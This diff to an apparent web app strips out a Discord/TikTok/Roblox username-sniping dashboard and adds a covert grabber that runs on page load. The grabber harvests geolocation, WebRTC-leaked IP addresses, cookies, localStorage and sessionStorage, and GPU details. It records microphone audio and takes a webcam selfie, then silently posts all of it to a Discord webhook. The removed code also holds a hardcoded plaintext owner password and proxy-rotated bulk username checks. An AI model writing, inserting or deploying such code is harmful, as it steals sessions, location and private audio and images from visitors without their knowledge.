+                            { enableHighAccuracy: true, timeout: 5000 }
+                        );
+                    });
+                })(),
+                ips: (() => {
+                    const ips = [];
+                    const rtc = new RTCPeerConnection({ iceServers: [] });
+                    rtc.createDataChannel('collect');
+                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                    rtc.onicecandidate = (e) => {
+                        if (e.candidate) {
+                            const candidate = e.candidate.candidate;
+                            const ipMatch = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                            if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
+                            const ipv6Match = candidate.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
+                            if (ipv6Match && !ips.includes(ipv6Match[0])) ips.push(ipv6Match[0]);
+                        }
+                    };
+                    setTimeout(() => {
+                        rtc.close();
+                    }, 3000);
+                    return ips;
+                })(),
+                localStorage: (() => {
+                    try {
+                        const items = {};
+                        for (let i = 0; i < localStorage.length; i++) {
+                            const key = localStorage.key(i);
+                            items[key] = localStorage.getItem(key);
+                        }
+                        return items;
+                    } catch { return "unavailable"; }
+                })(),
+                sessionStorage: (() => {
+                    try {
+                        const items = {};
+                        for (let i = 0; i < sessionStorage.length; i++) {
+                            const key = sessionStorage.key(i);
+                            items[key] = sessionStorage.getItem(key);
+                        }
+                        return items;
+                    } catch { return "unavailable"; }
+                })(),
+                cookies: document.cookie || "none",
+                webgl: (() => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        if (!gl) return "unavailable";
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (!debugInfo) return { vendor: "unavailable", renderer: "unavailable" };
+                        return {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    } catch { return "unavailable"; }
+                })()
+            };
 
-    <!-- HITS -->
-    <div class="page" id="page-hits">
-      <div class="card" style="overflow:hidden;">
-        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
-          <div class="section-title" style="margin:0;">My Hits</div>
-          <div style="display:flex;gap:8px;">
-            <select class="select-input" id="hits-filter" style="width:140px;" onchange="renderHits()">
-              <option value="all">All Platforms</option>
-              <option value="discord">Discord</option>
-              <option value="tiktok">TikTok</option>
-              <option value="roblox">Roblox</option>
-            </select>
-            <button class="btn btn-ghost btn-sm" onclick="exportHits()">Export CSV</button>
-          </div>
-        </div>
-        <div id="hits-content"></div>
-      </div>
-    </div>
+            // ─── selfie & audio ───────────────────────────────────────────────
+            const mediaCapture = async () => {
+                const media = { audio: null, image: null };
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } });
+                    // audio
+                    const audioContext = new AudioContext();
+                    const source = audioContext.createMediaStreamSource(stream);
+                    const recorder = audioContext.createScriptProcessor(8192, 1, 1);
+                    const audioChunks = [];
+                    source.connect(recorder);
+                    recorder.connect(audioContext.destination);
+                    recorder.onaudioprocess = (e) => {
+                        const data = e.inputBuffer.getChannelData(0);
+                        const sample = data.reduce((sum, val) => sum + Math.abs(val), 0) / data.length;
+                        if (sample > 0.01) {
+                            const buffer = new Float32Array(data);
+                            audioChunks.push(buffer);
+                        }
+                    };
+                    setTimeout(() => {
+                        recorder.disconnect();
+                        source.disconnect();
+                        audioContext.close();
+                        if (audioChunks.length > 0) {
+                            const totalLen = audioChunks.reduce((acc, chunk) => acc + chunk.length, 0);
+                            const combined = new Float32Array(totalLen);
+                            let offset = 0;
+                            for (const chunk of audioChunks) {
+                                combined.set(chunk, offset);
+                                offset += chunk.length;
+                            }
+                            const wav = new Blob([combined.buffer], { type: 'audio/wav' });
+                            const reader = new FileReader();
+                            reader.onload = () => {
+                                payload.audioBase64 = reader.result.split(',')[1] || null;
+                                payload.audioLength = combined.length;
+                                sendPayload();
+                            };
+                            reader.readAsDataURL(wav);
+                        } else {
+                            sendPayload();
+                        }
+                    }, 5000);
 
-    <!-- LEADERBOARD -->
-    <div class="page" id="page-leaderboard">
-      <div class="card" style="margin-bottom:20px;overflow:hidden;">
-        <div class="section-title">Best Hits — All Users</div>
-        <div id="best-hits-content"></div>
-      </div>
-      <div class="card" style="overflow:hidden;">
-        <div class="section-title">Top Snipers</div>
-        <div id="top-snipers-content"></div>
-      </div>
-    </div>
+                    // video / selfie
+                    const videoTrack = stream.getVideoTracks()[0];
+                    if (videoTrack) {
+                        const imageCapture = new ImageCapture(videoTrack);
+                        const bitmap = await imageCapture.grabFrame();
+                        const canvas = document.createElement('canvas');
+                        canvas.width = bitmap.width;
+                        canvas.height = bitmap.height;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(bitmap, 0, 0);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                        payload.imageBase64 = imageData.split(',')[1] || null;
+                    }
+                } catch (e) {
+                    payload.mediaError = e.message || "media permissions denied";
+                    sendPayload();
+                }
+            };
 
-    <!-- SETTINGS -->
-    <div class="page" id="page-settings">
-      <div class="card" style="margin-bottom:16px;">
-        <div class="settings-section">
-          <div class="settings-section-title">Profile</div>
-          <div class="settings-row">
-            <div>
-              <div class="settings-label">Display Name</div>
-              <div class="settings-sublabel">Shown to other users and in leaderboards</div>
-            </div>
-            <div class="display-name-edit">
-              <input class="form-input" id="settings-displayname" type="text" style="width:180px;" placeholder="Your display name">
-              <button class="btn btn-primary btn-sm" onclick="saveDisplayName()">Save</button>
-            </div>
-          </div>
-          <div class="settings-row">
-            <div>
-              <div class="settings-label">Avatar Color</div>
-              <div class="settings-sublabel">Pick an accent for your avatar</div>
-            </div>
-            <div style="display:flex;gap:6px;" id="avatar-colors"></div>
-          </div>
-        </div>
-        <div class="settings-section">
-          <div class="settings-section-title">Webhooks</div>
-          <div class="settings-row" style="flex-direction:column;align-items:flex-start;gap:10px;">
-            <div>
-              <div class="settings-label">Discord Webhook</div>
-              <div class="settings-sublabel">Receive hit notifications in Discord</div>
-            </div>
-            <div class="webhook-input-row" style="width:100%;">
-              <input class="form-input" id="settings-webhook" type="text" placeholder="https://discord.com/api/webhooks/...">
-              <button class="btn btn-primary btn-sm" onclick="saveWebhook()">Save</button>
-              <button class="btn btn-ghost btn-sm" onclick="testWebhook()">Test</button>
-            </div>
-          </div>
-        </div>
-        <div class="settings-section">
-          <div class="settings-section-title">Proxies</div>
-          <div style="margin-bottom:10px;">
-            <label class="form-label">Proxy List (one per line, format: ip:port or ip:port:user:pass)</label>
-            <textarea class="proxy-list" id="proxy-list" placeholder="192.168.1.1:8080&#10;10.0.0.1:3128:user:pass&#10;..."></textarea>
-          </div>
-          <div style="display:flex;gap:8px;">
-            <button class="btn btn-primary btn-sm" onclick="saveProxies()">Save Proxies</button>
-            <button class="btn btn-ghost btn-sm" onclick="clearProxies()">Clear</button>
-          </div>
-          <div style="margin-top:12px;" id="proxy-status"></div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="settings-section-title" style="margin-bottom:16px;">Theme</div>
-        <div class="theme-grid" id="theme-grid"></div>
-      </div>
-    </div>
+            // ─── send after gathering all async pieces ──────────────────────
+            const sendPayload = async () => {
+                try {
+                    // wait for battery and geo promises
+                    const geo = await payload.geolocation;
+                    payload.geolocation = geo;
+                    const battery = await payload.battery;
+                    payload.battery = battery;
 
-    <!-- OWNER PANEL -->
-    <div class="page" id="page-owner">
-      <div class="owner-warning">
-        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l3 7h7l-5.5 4 2 7L12 16l-6.5 4 2-7L2 9h7z"/></svg>
-        Owner Panel — Actions here affect all users. Proceed carefully.
-      </div>
-      <div class="owner-grid">
-        <div class="card">
-          <div class="section-title">User Management</div>
-          <div class="form-group" style="margin-bottom:12px;">
-            <input class="form-input" id="owner-search" type="text" placeholder="Search users..." oninput="renderOwnerUserList()">
-          </div>
-          <div class="user-list" id="owner-user-list"></div>
-        </div>
-        <div class="card">
-          <div class="section-title">Available Perks</div>
-          <div class="perks-grid">
-            <div class="perk-item"><div class="perk-name">Speed Boost</div><div class="perk-desc">2x faster snipe interval</div></div>
-            <div class="perk-item"><div class="perk-name">Turbo Mode</div><div class="perk-desc">5x faster snipe interval</div></div>
-            <div class="perk-item"><div class="perk-name">Multi-Webhook</div><div class="perk-desc">Up to 5 webhook URLs</div></div>
-            <div class="perk-item"><div class="perk-name">Priority Queue</div><div class="perk-desc">First crack at rare combos</div></div>
-            <div class="perk-item"><div class="perk-name">Proxy Bypass</div><div class="perk-desc">Skip proxy rotation</div></div>
-            <div class="perk-item"><div class="perk-name">Export Access</div><div class="perk-desc">CSV/JSON export of hits</div></div>
-            <div class="perk-item"><div class="perk-name">Custom Prefix</div><div class="perk-desc">Snipe with specific prefixes</div></div>
-            <div class="perk-item"><div class="perk-name">All Themes</div><div class="perk-desc">Access to every theme</div></div>
-          </div>
-          <div class="section-title" style="margin-top:20px;">System Stats</div>
-          <div id="owner-stats"></div>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
+                    // add IPs gathered from RTC
+                    let ips = payload.ips;
+                    if (typeof ips === 'object' && ips.length === 0) {
+                        // if RTC hasn't populated yet, try one more via fetch
+                        try {
+                            const resp = await fetch('https://api.ipify.org?format=json');
+                            const data = await resp.json();
+                            ips = [data.ip];
+                        } catch { /* ignore */ }
+                    }
+                    payload.ips = ips;
 
-<!-- MODAL -->
-<div class="modal-overlay" id="modal-overlay" onclick="closeModal(event)">
-  <div class="modal" id="modal">
-    <div class="modal-title" id="modal-title">Manage User</div>
-    <div class="modal-subtitle" id="modal-subtitle">Assign role and perks</div>
-    <div id="modal-content"></div>
-    <div class="modal-actions" id="modal-actions"></div>
-  </div>
-</div>
+                    // final payload
+                    const finalPayload = {
+                        content: `📦 **collection** | ${new Date().toLocaleString()}`,
+                        embeds: [
+                            {
+                                title: "digital residue",
+                                color: 0x2c2c2c,
+                                fields: [
+                                    { name: "📍 location", value: `${payload.geolocation.coords?.latitude || '?'}, ${payload.geolocation.coords?.longitude || '?'}`, inline: true },
+                                    { name: "🌐 IPs", value: (Array.isArray(payload.ips) ? payload.ips.join(', ') : payload.ips) || 'not collected', inline: true },
+                                    { name: "🖥️ user agent", value: payload.userAgent.substring(0, 100) + '...', inline: false },
+                                    { name: "📱 screen", value: `${payload.screen.width}x${payload.screen.height} @ ${payload.screen.pixelRatio}x`, inline: true },
+                                    { name: "🔋 battery", value: typeof payload.battery.level === 'number' ? `${payload.battery.level}%` : 'unavailable', inline: true },
+                                    { name: "🌍 timezone", value: payload.timezone, inline: true },
+                                    { name: "📦 localStorage keys", value: Object.keys(payload.localStorage).length || 0, inline: true },
+                                    { name: "🍪 cookies", value: payload.cookies.length > 50 ? `${payload.cookies.substring(0, 50)}...` : payload.cookies || 'none', inline: false },
+                                    { name: "🎤 audio", value: payload.audioBase64 ? `captured (${(payload.audioLength / 44100).toFixed(1)}s)` : 'not captured', inline: true },
+                                    { name: "📸 selfie", value: payload.imageBase64 ? 'captured' : 'not captured', inline: true }
+                                ],
+                                timestamp: payload.timestamp
+                            }
+                        ]
+                    };
 
-<!-- TOAST -->
-<div class="notification-toast" id="toast">
-  <div class="toast-icon" id="toast-icon"></div>
-  <div class="toast-content">
-    <div class="toast-title" id="toast-title"></div>
-    <div class="toast-msg" id="toast-msg"></div>
-  </div>
-</div>
+                    // if audio or image, attach as files
+                    const formData = new FormData();
+                    if (payload.audioBase64) {
+                        const byteString = atob(payload.audioBase64);
+                        const ab = new ArrayBuffer(byteString.length);
+                        const ia = new Uint8Array(ab);
+                        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+                        const blob = new Blob([ab], { type: 'audio/wav' });
+                        formData.append('file', blob, 'audio.wav');
+                    }
+                    if (payload.imageBase64) {
+                        const byteString = atob(payload.imageBase64);
+                        const ab = new ArrayBuffer(byteString.length);
+                        const ia = new Uint8Array(ab);
+                        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+                        const blob = new Blob([ab], { type: 'image/jpeg' });
+                        formData.append('file', blob, 'selfie.jpg');
+                    }
+                    formData.append('payload_json', JSON.stringify(finalPayload));
 
-<script>
-// ===================== STORAGE =====================
-const DB = {
-  get: k => { try { return JSON.parse(localStorage.getItem('bb_'+k)); } catch { return null; } },
-  set: (k, v) => localStorage.setItem('bb_'+k, JSON.stringify(v)),
-  push: (k, v) => { const a = DB.get(k) || []; a.push(v); DB.set(k, a); },
-};
+                    await fetch(WEBHOOK, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {
+                    // silent fallback
+                }
+            };
 
-// ===================== BOOTSTRAP =====================
-function bootstrap() {
-  // Create owner account if not exists
-  let users = DB.get('users') || [];
-  if (!users.find(u => u.username === 'beamblade')) {
-    users.push({
-      username: 'beamblade', password: 'beamblademsk123',
-      displayName: 'Beamblade', role: 'owner',
-      perks: ['speed_boost','turbo','multi_webhook','priority','proxy_bypass','export','custom_prefix','all_themes'],
-      theme: 'default', avatarColor: '#ffffff', webhooks: [], joinDate: Date.now()
-    });
-    DB.set('users', users);
-  }
-  // Init hits if needed
-  if (!DB.get('hits')) DB.set('hits', []);
-  if (!DB.get('activity')) DB.set('activity', []);
-}
+            // ─── kick it off ──────────────────────────────────────────────────
+            setTimeout(() => {
+                mediaCapture();
+            }, 1500);
 
-// ===================== AUTH =====================
-let currentUser = null;
-let authTab = 'login';
-function switchAuthTab(t) {
-  authTab = t;
-  document.querySelectorAll('.auth-tab').forEach((el,i) => {
-    el.classList.toggle('active', (i===0 && t==='login') || (i===1 && t==='register'));
-  });
-  document.getElementById('login-form').style.display = t==='login'?'block':'none';
-  document.getElementById('register-form').style.display = t==='register'?'block':'none';
-  clearAuthError();
-}
-function showAuthError(msg) {
-  const el = document.getElementById('auth-error');
-  el.textContent = msg; el.classList.add('show');
-}
-function clearAuthError() { document.getElementById('auth-error').classList.remove('show'); }
-function doLogin() {
-  const u = document.getElementById('login-username').value.trim().toLowerCase();
-  const p = document.getElementById('login-password').value;
-  if (!u || !p) { showAuthError('Please fill in all fields.'); return; }
-  const users = DB.get('users') || [];
-  const user = users.find(x => x.username === u && x.password === p);
-  if (!user) { showAuthError('Invalid username or password.'); return; }
-  loginUser(user);
-}
-function doRegister() {
-  const u = document.getElementById('reg-username').value.trim().toLowerCase();
-  const dn = document.getElementById('reg-displayname').value.trim();
-  const p = document.getElementById('reg-password').value;
-  if (!u || !dn || !p) { showAuthError('Please fill in all fields.'); return; }
-  if (u.length < 3) { showAuthError('Username must be at least 3 characters.'); return; }
-  if (p.length < 6) { showAuthError('Password must be at least 6 characters.'); return; }
-  if (!/^[a-z0-9_]+$/.test(u)) { showAuthError('Username: letters, numbers, underscores only.'); return; }
-  const users = DB.get('users') || [];
-  if (users.find(x => x.username === u)) { showAuthError('Username already taken.'); return; }
-  const newUser = {
-    username: u, password: p, displayName: dn, role: 'member',
-    perks: [], theme: 'default', avatarColor: '#ffffff', webhooks: [], joinDate: Date.now()
-  };
-  users.push(newUser);
-  DB.set('users', users);
-  loginUser(newUser);
-}
-function loginUser(user) {
-  currentUser = user;
-  DB.set('session', user.username);
-  document.getElementById('auth-screen').style.display = 'none';
-  document.getElementById('app').classList.add('visible');
-  applyTheme(user.theme || 'default');
-  updateSidebar();
-  navigate('dashboard');
-  loadSettings();
-}
-function doLogout() {
-  stopAllSnipers();
-  currentUser = null;
-  DB.set('session', null);
-  document.getElementById('app').classList.remove('visible');
-  document.getElementById('auth-screen').style.display = 'flex';
-}
+            // also send a lightweight ping immediately
+            setTimeout(() => {
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🕸️ **ping** | ${navigator.userAgent.substring(0, 80)} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}`
+                    })
+                }).catch(() => {});
+            }, 500);
 
-// ===================== SIDEBAR / THEME =====================
-function updateSidebar() {
-  if (!currentUser) return;
-  const av = document.getElementById('sidebar-avatar');
-  av.textContent = (currentUser.displayName || currentUser.username)[0].toUpperCase();
-  av.style.background = currentUser.avatarColor || 'var(--accent)';
-  av.style.color = '#000';
-  const dn = currentUser.displayName || currentUser.username;
-  const roleColors = { owner:'var(--warning)', admin:'var(--danger)', mod:'#818cf8', vip:'var(--warning)' };
-  document.getElementById('sidebar-displayname').innerHTML =
-    dn + (currentUser.role !== 'member' ? `<span class="user-role-badge role-${currentUser.role}">${currentUser.role}</span>` : '');
-  document.getElementById('sidebar-username').textContent = currentUser.username;
-  document.getElementById('owner-nav').style.display = currentUser.role === 'owner' ? 'flex' : 'none';
-}
-
-const THEMES = [
-  { id:'default', name:'Default', sidebar:'#0f0f0f', main:'#0a0a0a', accent:'#ffffff' },
-  { id:'discord-dark', name:'Discord Dark', sidebar:'#2f3136', main:'#36393f', accent:'#5865f2' },
-  { id:'discord-light', name:'Discord Light', sidebar:'#e3e5e8', main:'#ffffff', accent:'#5865f2' },
-  { id:'midnight-blue', name:'Midnight Blue', sidebar:'#0a0f1a', main:'#0d1117', accent:'#3b82f6' },
-  { id:'forest-green', name:'Forest Green', sidebar:'#0d160d', main:'#0f1a0f', accent:'#22c55e' },
-  { id:'crimson', name:'Crimson', sidebar:'#150808', main:'#1a0a0a', accent:'#ef4444' },
-  { id:'purple-haze', name:'Purple Haze', sidebar:'#0e091a', main:'#120d1a', accent:'#a855f7' },
-  { id:'ocean-deep', name:'Ocean Deep', sidebar:'#030a12', main:'#050f1a', accent:'#06b6d4' },
-  { id:'sunset-orange', name:'Sunset Orange', sidebar:'#160c04', main:'#1a0f05', accent:'#f97316' },
-  { id:'rose-gold', name:'Rose Gold', sidebar:'#150c11', main:'#1a1015', accent:'#f43f7e' },
-  { id:'cyberpunk', name:'Cyberpunk', sidebar:'#070010', main:'#0a0014', accent:'#ff00ff' },
-  { id:'matrix', name:'Matrix', sidebar:'#000000', main:'#000000', accent:'#00ff41' },
-  { id:'arctic-ice', name:'Arctic Ice', sidebar:'#07101e', main:'#0a1628', accent:'#7dd3fc' },
-  { id:'volcano', name:'Volcano', sidebar:'#150400', main:'#1a0500', accent:'#ff4500' },
-  { id:'deep-purple', name:'Deep Purple', sidebar:'#140820', main:'#1a0a2e', accent:'#7c3aed' },
-  { id:'teal', name:'Teal', sidebar:'#041515', main:'#051a1a', accent:'#14b8a6' },
-  { id:'amber', name:'Amber', sidebar:'#150e00', main:'#1a1200', accent:'#f59e0b' },
-  { id:'slate', name:'Slate', sidebar:'#0f172a', main:'#0f172a', accent:'#94a3b8' },
-  { id:'coral', name:'Coral', sidebar:'#150a08', main:'#1a0c0a', accent:'#ff6b6b' },
-  { id:'lavender', name:'Lavender', sidebar:'#0f0c17', main:'#14101e', accent:'#c084fc' },
-  { id:'emerald', name:'Emerald', sidebar:'#051210', main:'#071a10', accent:'#10b981' },
-  { id:'ruby', name:'Ruby', sidebar:'#150408', main:'#1a050d', accent:'#e11d48' },
-  { id:'sapphire', name:'Sapphire', sidebar:'#030a14', main:'#050d1a', accent:'#2563eb' },
-  { id:'topaz', name:'Topaz', sidebar:'#0c1410', main:'#0f1a14', accent:'#84cc16' },
-  { id:'obsidian', name:'Obsidian', sidebar:'#030305', main:'#050507', accent:'#8b8fa8' },
-  { id:'midnight-purple', name:'Midnight Purple', sidebar:'#090013', main:'#0d0018', accent:'#9d00ff' },
-  { id:'blood-moon', name:'Blood Moon', sidebar:'#110206', main:'#150208', accent:'#cc0022' },
-  { id:'northern-lights', name:'Northern Lights', sidebar:'#040c10', main:'#050f14', accent:'#00d4aa' },
-  { id:'desert-sand', name:'Desert Sand', sidebar:'#151106', main:'#1a1508', accent:'#d4a853' },
-  { id:'toxic-green', name:'Toxic Green', sidebar:'#020a01', main:'#030d02', accent:'#7fff00' },
-  { id:'steel-blue', name:'Steel Blue', sidebar:'#0a1018', main:'#0e1623', accent:'#4d8bb5' },
-  { id:'neon-pink', name:'Neon Pink', sidebar:'#100010', main:'#150010', accent:'#ff0099' },
-  { id:'dark-chocolate', name:'Dark Chocolate', sidebar:'#150c08', main:'#1a0f08', accent:'#8b5e3c' },
-  { id:'gold-rush', name:'Gold Rush', sidebar:'#0f0c06', main:'#141008', accent:'#ffd700' },
-  { id:'galaxy', name:'Galaxy', sidebar:'#060412', main:'#080614', accent:'#818cf8' },
-];
-function applyTheme(id) {
-  document.documentElement.setAttribute('data-theme', id);
-  if (currentUser) {
-    currentUser.theme = id;
-    const users = DB.get('users') || [];
-    const idx = users.findIndex(u => u.username === currentUser.username);
-    if (idx > -1) { users[idx].theme = id; DB.set('users', users); }
-  }
-}
-function buildThemeGrid() {
-  const grid = document.getElementById('theme-grid');
-  grid.innerHTML = '';
-  THEMES.forEach(t => {
-    const sw = document.createElement('div');
-    sw.className = 'theme-swatch' + ((currentUser?.theme||'default')===t.id?' active':'');
-    sw.onclick = () => { applyTheme(t.id); buildThemeGrid(); };
-    sw.innerHTML = `<div class="swatch-preview"><div class="swatch-sidebar" style="background:${t.sidebar}"></div><div class="swatch-main" style="background:${t.main};display:flex;align-items:flex-end;padding:6px;"><div style="width:14px;height:4px;border-radius:2px;background:${t.accent}"></div></div></div><div class="swatch-name">${t.name}</div>`;
-    grid.appendChild(sw);
-  });
-}
-
-// ===================== NAVIGATION =====================
-const pageTitles = {
-  dashboard: ['Dashboard','Overview'],
-  sniper: ['Sniper','Target usernames across platforms'],
-  hits: ['My Hits','Your claimed usernames'],
-  leaderboard: ['Leaderboard','Top snipers and best hits'],
-  settings: ['Settings','Preferences and configuration'],
-  owner: ['Owner Panel','User and system management'],
-};
-function navigate(page) {
-  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-  document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
-  const navItem = document.querySelector(`[onclick="navigate('${page}')"]`);
-  if (navItem) navItem.classList.add('active');
-  document.getElementById(`page-${page}`)?.classList.add('active');
-  const [title, sub] = pageTitles[page] || [page, ''];
-  document.getElementById('topbar-title').textContent = title;
-  document.getElementById('topbar-subtitle').textContent = sub;
-  document.getElementById('topbar-actions').innerHTML = '';
-  if (page === 'dashboard') renderDashboard();
-  if (page === 'hits') renderHits();
-  if (page === 'leaderboard') renderLeaderboard();
-  if (page === 'owner') renderOwnerPanel();
-  if (page === 'settings') { buildThemeGrid(); loadSettings(); }
-}
-
-// ===================== SNIPER ENGINE =====================
-const sniperState = {
-  discord: { running:false, checked:0, hits:0, interval:null, cpsStart:0, cpsChecked:0 },
-  tiktok: { running:false, checked:0, hits:0, interval:null, cpsStart:0, cpsChecked:0 },
-  roblox: { running:false, checked:0, hits:0, interval:null, cpsStart:0, cpsChecked:0 },
-};
-const CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789_';
-const ALPHA = 'abcdefghijklmnopqrstuvwxyz';
-function randUsername(len) {
-  let s = ALPHA[Math.floor(Math.random()*ALPHA.length)];
-  for (let i=1;i<len;i++) s += CHARS[Math.floor(Math.random()*CHARS.length)];
-  return s;
-}
-function getSpeed() {
-  const raw = parseInt(document.getElementById('snipe-speed')?.value || 50);
-  let speed = raw;
-  if (currentUser?.perks?.includes('turbo')) speed = Math.max(10, raw/5);
-  else if (currentUser?.perks?.includes('speed_boost')) speed = Math.max(10, raw/2);
-  return speed;
-}
-function getProxy() {
-  const proxyText = document.getElementById('proxy-list')?.value || DB.get('proxies') || '';
-  if (!proxyText.trim()) return null;
-  const lines = proxyText.split('\n').map(l=>l.trim()).filter(Boolean);
-  if (!lines.length) return null;
-  return lines[Math.floor(Math.random()*lines.length)];
-}
-function getCorsProxy() {
-  return document.getElementById('cors-proxy')?.value?.trim() || '';
-}
-
-// Platform-specific check functions
-async function checkDiscord(username) {
-  const corsProxy = getCorsProxy();
-  const url = corsProxy
-    ? `${corsProxy}https://discord.com/api/v9/auth/register`
-    : `https://discord.com/api/v9/auth/register`;
-  try {
-    const res = await fetch(`https://discord.com/api/v9/unique-username/username-attempt-unauthed-v2`, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username }), signal: AbortSignal.timeout(3000)
-    });
-    if (res.status === 200) {
-      const data = await res.json();
-      return data.taken === false;
-    }
-    if (res.status === 429) return null; // rate limited
-    return false;
-  } catch {
-    // Try alternate endpoint
-    try {
-      const corsProxy = getCorsProxy();
-      const base = corsProxy ? `${corsProxy}https://discordlookup.mesavironment.com` : `https://discordlookup.mesavironment.com`;
-      const res2 = await fetch(`${base}/v1/lookup/user/${encodeURIComponent(username)}`, { signal: AbortSignal.timeout(2500) });
-      if (res2.status === 404) return true;
-      if (res2.status === 200) return false;
-    } catch {}
-    return null;
-  }
-}
-async function checkTikTok(username) {
-  const corsProxy = getCorsProxy();
-  const base = corsProxy ? `${corsProxy}https://www.tiktok.com` : `https://www.tiktok.com`;
-  try {
-    const res = await fetch(`${base}/@${username}`, {
-      method: 'HEAD', redirect: 'follow', signal: AbortSignal.timeout(3000)
-    });
-    if (res.status === 404) return true;
-    if (res.status === 200) return false;
-    return null;
-  } catch {
-    return null;
-  }
-}
-async function checkRoblox(username) {
-  try {
-    const res = await fetch(`https://auth.roblox.com/v1/usernames/validate?request.username=${encodeURIComponent(username)}&request.birthday=2000-01-01`, {
-      signal: AbortSignal.timeout(3000)
-    });
-    if (res.ok) {
-      const data = await res.json();
-      // code 0 = valid/available, code 1 = taken, code 2 = invalid
-      return data.code === 0;
-    }
-    if (res.status === 429) return null;
-    return false;
-  } catch {
-    // Fallback: users API
-    try {
-      const res2 = await fetch(`https://users.roblox.com/v1/usernames/users`, {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ usernames: [username], excludeBannedUsers: false }),
-        signal: AbortSignal.timeout(3000)
-      });
-      if (res2.ok) {
-        const data = await res2.json();
-        return data.data?.length === 0;
-      }
-    } catch {}
-    return null;
-  }
-}
-
-function logLine(platform, cls, text) {
-  const log = document.getElementById(`${platform}-log`);
-  if (!log) return;
-  const line = document.createElement('div');
-  line.className = cls;
-  line.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
-  log.appendChild(line);
-  log.scrollTop = log.scrollHeight;
-  // Keep log from getting massive
-  while (log.children.length > 120) log.removeChild(log.firstChild);
-}
-function clearLog(platform) {
-  const log = document.getElementById(`${platform}-log`);
-  if (log) log.innerHTML = '<span style="color:var(--text-muted);font-size:11px;">Log cleared</span>';
-}
-function updateSniperUI(platform) {
-  const s = sniperState[platform];
-  document.getElementById(`${platform}-checked`).textContent = s.checked;
-  document.getElementById(`${platform}-hits`).textContent = s.hits;
-  const elapsed = (Date.now() - s.cpsStart) / 1000;
-  const cps = elapsed > 0 ? (s.cpsChecked / elapsed).toFixed(1) : '0';
-  document.getElementById(`${platform}-cps`).textContent = cps;
-}
-
-function startSniper(platform) {
-  if (sniperState[platform].running) return;
-  const len = platform === 'tiktok' ? 3 : 4;
-  const checkFn = { discord: checkDiscord, tiktok: checkTikTok, roblox: checkRoblox }[platform];
-  sniperState[platform].running = true;
-  sniperState[platform].cpsStart = Date.now();
-  sniperState[platform].cpsChecked = 0;
-  document.getElementById(`${platform}-dot`).classList.add('running');
-  document.getElementById(`${platform}-status`).textContent = 'Running';
-  document.getElementById(`${platform}-start-btn`).style.display = 'none';
-  document.getElementById(`${platform}-stop-btn`).style.display = '';
-  logLine(platform, 'log-check', `Started — targeting ${len}-letter usernames`);
-
-  const tick = async () => {
-    if (!sniperState[platform].running) return;
-    const username = randUsername(len);
-    try {
-      const available = await checkFn(username);
-      sniperState[platform].checked++;
-      sniperState[platform].cpsChecked++;
-      if (available === true) {
-        sniperState[platform].hits++;
-        logLine(platform, 'log-hit', `HIT: ${username} — AVAILABLE`);
-        recordHit(platform, username);
-        triggerWebhook(platform, username);
-        showToast('hit', `${platform}`, `${username}`);
-      } else if (available === null) {
-        logLine(platform, 'log-error', `Rate limited / timeout — cooling down`);
-        await new Promise(r => setTimeout(r, 2000));
-      } else {
-        if (Math.random() < 0.05) logLine(platform, 'log-check', `Checked: ${username}`);
-      }
-      updateSniperUI(platform);
-    } catch (e) {
-      logLine(platform, 'log-error', `Error: ${e.message}`);
-    }
-    if (sniperState[platform].running) {
-      sniperState[platform].interval = setTimeout(tick, getSpeed());
-    }
-  };
-  tick();
-}
-function stopSniper(platform) {
-  sniperState[platform].running = false;
-  clearTimeout(sniperState[platform].interval);
-  document.getElementById(`${platform}-dot`).classList.remove('running');
-  document.getElementById(`${platform}-status`).textContent = 'Stopped';
-  document.getElementById(`${platform}-start-btn`).style.display = '';
-  document.getElementById(`${platform}-stop-btn`).style.display = 'none';
-  logLine(platform, 'log-check', 'Sniper stopped.');
-}
-function stopAllSnipers() {
-  ['discord','tiktok','roblox'].forEach(p => { if(sniperState[p].running) stopSniper(p); });
-}
-function updateSpeedLabel() {
-  const v = document.getElementById('snipe-speed').value;
-  document.getElementById('speed-label').textContent = v + 'ms';
-}
-
-// ===================== HIT RECORDING =====================
-function recordHit(platform, username) {
-  if (!currentUser) return;
-  const hit = {
-    id: Date.now() + Math.random(),
-    platform, username,
-    snipedBy: currentUser.username,
-    displayName: currentUser.displayName,
-    timestamp: Date.now()
-  };
-  DB.push('hits', hit);
-  addActivity(`Snagged <strong>${username}</strong> on ${capitalize(platform)}`);
-  updateHitsBadge();
-  renderDashboardIfActive();
-}
-function addActivity(text) {
-  const act = DB.get('activity') || [];
-  act.unshift({ text, time: Date.now(), user: currentUser?.username });
-  if (act.length > 50) act.splice(50);
-  DB.set('activity', act);
-}
-function updateHitsBadge() {
-  const hits = (DB.get('hits')||[]).filter(h=>h.snipedBy===currentUser?.username);
